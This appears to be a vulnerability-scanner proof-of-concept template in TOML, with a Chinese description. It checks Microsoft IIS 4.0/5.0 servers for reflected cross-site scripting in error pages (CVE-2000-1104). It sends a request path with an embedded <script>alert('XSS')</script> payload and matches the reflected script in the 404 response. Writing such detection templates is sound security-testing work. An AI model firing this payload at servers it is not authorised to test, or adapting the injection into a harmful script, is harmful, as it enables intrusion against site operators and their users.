[info]
author = "ave"
description = "向 IIS 服务器发送包含恶意脚本的特制 URL 请求，触发 404 错误页面反射未转义的脚本内容，验证跨站脚本漏洞存在"
id = "POC-AVE-2000-2006"
name = "Microsoft IIS 4.0/5.0 错误消息跨站脚本攻击 PoC"
severity = "high"
tags = ["ave-2000-2006"]
vuln_id = [
    "CVE-2000-1104",
    "AVE-2000-2006",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nonexistent<script>alert('XSS')</script>.asp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert('XSS')</script>"]
